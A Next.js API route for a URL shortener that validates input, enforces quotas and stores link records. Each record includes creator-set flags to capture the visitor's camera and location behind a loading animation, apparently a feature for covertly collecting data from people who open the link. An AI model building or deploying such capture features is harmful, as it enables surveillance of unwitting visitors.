import { NextResponse } from "next/server";
import {
  codeExists,
  createLink,
  getUserById,
  hashPassword,
  updateUser,
} from "@/lib/db";
import { bearerFromRequest, dailyLimitFor, usageToday, verifyToken } from "@/lib/auth";
import { asBool, asString, isHttpUrl, normalizeExpiry, normalizeUrl, rateLimit, sanitizeAlias } from "@/lib/validate";
import type { ShortenRequestBody } from "@/lib/types";

export const runtime = "nodejs";
export const dynamic = "force-dynamic";

function baseUrl(req: Request): string {
  const env = process.env.NEXT_PUBLIC_SITE_URL;
  if (env) return env.replace(/\/+$/, "");
  const proto = req.headers.get("x-forwarded-proto") || "http";
  const host = req.headers.get("host") || "localhost:3000";
  return `${proto}://${host}`;
}

export async function POST(req: Request) {
  const ip =
    (req.headers.get("x-forwarded-for") || "").split(",")[0].trim() || "local";
  if (!rateLimit(`shorten:${ip}`, 40, 60000)) {
    return NextResponse.json(
      { success: false, error: "Too many requests. Please slow down." },
      { status: 429 },
    );
  }

  let body: ShortenRequestBody;
  try {
    body = (await req.json()) as ShortenRequestBody;
  } catch {
    return NextResponse.json(
      { success: false, error: "Invalid JSON body" },
      { status: 400 },
    );
  }

  const longUrl = normalizeUrl(asString(body.longUrl, 2000) || "");
  if (!longUrl || !isHttpUrl(longUrl)) {
    return NextResponse.json(
      { success: false, error: "Please enter a valid destination URL." },
      { status: 400 },
    );
  }

  const deviceId = asString(body.deviceId, 120) || null;
  let phoneNumber = asString(body.phoneNumber, 40) || null;

  // Identify the owner of the link (logged-in user > phone > device).
  const tokenUser = verifyToken(bearerFromRequest(req));
  const user = tokenUser ? await getUserById(tokenUser) : null;
  if (!deviceId && !phoneNumber && !user) {
    return NextResponse.json(
      {
        success: false,
        error:
          "Device ID or Phone Number is required to link this short URL to your history.",
      },
      { status: 400 },
    );
  }

  // Free-plan daily quota (premium bypasses the limit).
  if (user) {
    const dailyLimit = dailyLimitFor(user);
    if (usageToday(user) >= dailyLimit) {
      return NextResponse.json(
        {
          success: false,
          error: `Daily limit of ${dailyLimit} links reached. Redeem a coupon for more.`,
        },
        { status: 403 },
      );
    }
  }

  let alias = sanitizeAlias(body.customAlias);
  // A non-empty alias that fails sanitisation must be reported, not silently
  // replaced with a random code (reserved words, bad length, bad characters).
  if (!alias && asString(body.customAlias, 40)) {
    return NextResponse.json(
      {
        success: false,
        error:
          "Custom alias must be 3–25 characters (letters, numbers, dashes, underscores) and must not be a reserved word.",
      },
      { status: 400 },
    );
  }
  if (alias && (await codeExists(alias))) {
    return NextResponse.json(
      { success: false, error: "That custom alias is already taken." },
      { status: 409 },
    );
  }
  alias = alias || undefined;

  const socialTitle = asString(body.socialGateTitle, 120);
  const socialUrl = asString(body.socialGateUrl, 500);
  const password = asString(body.password, 120);

  // Reject an unparseable expiry rather than silently dropping it, which would
  // produce a permanent link the owner believes is time-limited.
  const expiry = normalizeExpiry(body.expiresAt);
  if (expiry === undefined) {
    return NextResponse.json(
      { success: false, error: "That expiration date could not be understood." },
      { status: 400 },
    );
  }

  const record = await createLink({
    short_code: alias,
    long_url: longUrl,
    phone_number: phoneNumber,
    device_id: deviceId,
    password_hash: password ? hashPassword(password) : null,
    social_gate_title: socialTitle || null,
    social_gate_url: socialUrl || null,
    social_gate_icon: asString(body.socialGateIcon, 30) || "link",
    social_gate_description: asString(body.socialGateDesc, 240) || null,
    social_gate_button_text: asString(body.socialGateBtnText, 60) || null,
    animation_type: asString(body.animationType, 30) || "ring",
    animation_text: asString(body.animationText, 40) || "LOADING",
    capture_camera: asBool(body.captureCamera),
    capture_location: asBool(body.captureLocation),
    expires_at: expiry,
    user_id: user?.id || null,
  });

  if (user) {
    const today = new Date().toISOString().slice(0, 10);
    await updateUser(user.id, {
      total_links_used: user.total_links_used + 1,
      daily_date: today,
      daily_count: usageToday(user) + 1,
    });
  }

  const shortUrl = `${baseUrl(req)}/${record.short_code}`;
  return NextResponse.json(
    { success: true, shortUrl, data: record },
    { status: 201 },
  );
}
